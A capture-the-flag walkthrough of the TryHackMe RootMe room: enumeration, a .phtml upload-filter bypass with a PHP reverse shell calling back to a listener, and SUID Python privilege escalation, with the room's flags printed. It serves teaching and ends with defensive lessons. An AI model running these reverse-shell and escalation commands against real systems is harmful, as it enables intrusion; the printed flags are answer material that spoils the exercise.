# TryHackMe — RootMe

A practical walkthrough of the **RootMe** room, covering web enumeration, an upload-filter bypass, a reverse shell, and privilege escalation through a misconfigured SUID Python interpreter.

> **Scope:** This write-up documents my own path and the commands visible in my screenshots. Run these steps only against the TryHackMe target assigned to your account or another system you are authorized to test.

## 1. Add the target hostname

I first mapped the target IP to `root-me.thm` in `/etc/hosts`. This lets me use the hostname instead of typing the current target IP in every request. The IP assigned by TryHackMe can change when a machine is restarted, so use the IP shown in your own deployment.

Edit the hosts file as root:

```bash
sudo nano /etc/hosts
```

Add a line in this format:

```text
<TARGET_IP> root-me.thm
```

Save the file, then open `http://root-me.thm/` in the browser.

![Target website](screenshots/root-me-2.png)

## 2. Nmap scan

I scanned the target with Nmap's default scripts and version detection:

```bash
nmap -sC -sV root-me.thm -o nmap_scan.txt
```

The scan identified two open TCP ports:

| Port | Service | Finding |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 on Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.41 on Ubuntu |

Nmap also reported that the `PHPSESSID` cookie did not have the `HttpOnly` flag set. I noted this, but it was not the route I used to obtain access.

Full scan output is included in [`nmap_scan.txt`](nmap_scan.txt).

![Nmap scan](screenshots/root-me-1.png)

## 3. Manual website enumeration

I started with the website on port 80. The homepage was very simple and did not expose an obvious interactive feature. I checked the page source as well, but did not find anything useful there. The page text appeared to be Portuguese, which was a useful observation but not a vulnerability by itself.

At this point, I moved from manual browsing to directory enumeration rather than assuming that the visible homepage represented the whole application.

## 4. Gobuster directory enumeration

I ran Gobuster against the web root with the wordlist and extensions shown in my terminal screenshot:

```bash
gobuster dir -u http://root-me.thm/ -w big.txt -x php,json,js,txt,html,php.php,bak --no-error
```

The scan found several paths, including:

| Path | Result | Why it mattered |
|---|---|---|
| `/panel/` | Redirect (301) | Upload form; this became the initial-access route. |
| `/uploads/` | Redirect (301) | Public directory where uploaded files could be accessed. |
| `/index.php` | HTTP 200 | Main page. |
| `/css/`, `/js/` | Redirect (301) | Static assets. |
| `/server-status` | HTTP 403 | Access denied. |

The important discovery was the combination of `/panel/` and `/uploads/`: one allowed files to be submitted, while the other exposed uploaded files.

![Gobuster results](screenshots/root-me-5.png)

## 5. Inspect the upload panel

I opened `http://root-me.thm/panel/` and found a file-upload form. The form's success message was in Portuguese; the response included a link to the uploaded file under `/uploads/`.

![Upload panel](screenshots/root-me-3.png)

My first attempts included Bash reverse-shell files. They were uploaded or displayed as text rather than executed by the server. That suggested I needed a server-side script that Apache would interpret as PHP and a filename extension accepted by the upload filter.

## 6. Bypass the PHP extension filter with `.phtml`

I first tried uploading the PentestMonkey PHP reverse shell with a `.php` extension, but the application rejected it. I researched alternative extensions that Apache may treat as PHP and used **`.phtml`** for the successful upload.

The important lesson was that blocking only the `.php` extension does not necessarily prevent PHP execution. Whether an alternative extension is executed depends on the server's Apache/PHP configuration, so this behavior should be verified on the target rather than assumed.

## 7. Prepare and upload the reverse shell

I used the PentestMonkey PHP reverse shell and uploaded it with the `.phtml` extension so the upload filter would accept it. The supplied [`shell.phtml`](shell.phtml) file is included with this write-up.

Before uploading, the reverse shell's callback IP and port must match the attacking machine and listener. In the supplied shell file, these values were:

```php
$ip = 'YOUR_IP';
$port = 4444;
```

After the upload, I accessed the uploaded `.phtml` file through the web server to trigger the reverse connection.

## 8. Catch the reverse shell

I started a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

With the listener running, I opened the uploaded `.phtml` reverse-shell file in the browser. Apache/PHP interpreted the file as PHP and the reverse connection arrived. The shell ran as `www-data` (UID 33), which is the web-server account—not root.

![Reverse shell received](screenshots/root-me-9.png)

The listener output confirmed the target connected back from the machine at `10.48.162.71` and showed:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 9. Find the user flag

From the reverse shell, I searched the filesystem for `user.txt`:

```bash
find / -type f -name user.txt 2>/dev/null
```

The file was located at `/var/www/user.txt`. I read it with:

```bash
cat /var/www/user.txt
```

The screenshot records the user flag as:

```text
THM{y0u_g0t_a_sh3ll}
```

![Locate and read user flag](screenshots/root-me-10.png)

## 10. Enumerate SUID binaries

The next room task asked for privilege escalation using a suspicious SUID binary. I searched for files with the SUID bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the results, `/usr/bin/python2.7` stood out. A root-owned Python interpreter with SUID set is dangerous because it can execute arbitrary Python code with the file owner's effective privileges.

![SUID enumeration](screenshots/root-me-11.png)

## 11. Escalate privileges with SUID Python

I researched the SUID Python technique and used the following command from the shell:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `os.execl()` call replaces the Python process with `/bin/sh`. The `-p` option asks the shell to preserve its effective UID rather than dropping it. Because the Python interpreter was SUID-root, this provided a shell with effective root privileges.

I verified the result with:

```bash
whoami
```

The output was `root`. I then checked `/root` and read the root flag:

```bash
cd /root && ls
cat root.txt
```

The screenshot records the root flag as:

```text
THM{privil3g3_3sc414t10n}
```

![SUID Python root shell and root flag](screenshots/root-me-12.png)


## 12. Tools used

- **Nmap** — service and version enumeration.
- **Gobuster** — web directory and extension enumeration.
- **Web browser** — manual inspection and triggering the uploaded file.
- **Netcat** — receiving the reverse shell.
- **Linux `find`, `cat`, and `whoami`** — locating flags, finding SUID files, and verifying privileges.
- **PentestMonkey PHP reverse shell** — initial shell payload.
- **GTFOBins** — understanding the SUID Python escalation path.

## 13. Key takeaways

- A plain homepage does not mean the web application has no useful endpoints. Directory enumeration can reveal functionality that is not linked from the home page.
- A file-upload feature combined with a publicly accessible upload directory deserves careful testing.
- Blocking only `.php` is insufficient if other PHP-handled extensions such as `.phtml` are allowed by the server configuration. Use a strict upload allowlist, validate content, store uploads outside the web root, and disable script execution in upload directories.
- Always enumerate SUID binaries after obtaining a low-privilege shell. Interpreters such as Python should not ordinarily be SUID-root.

**RootMe completed**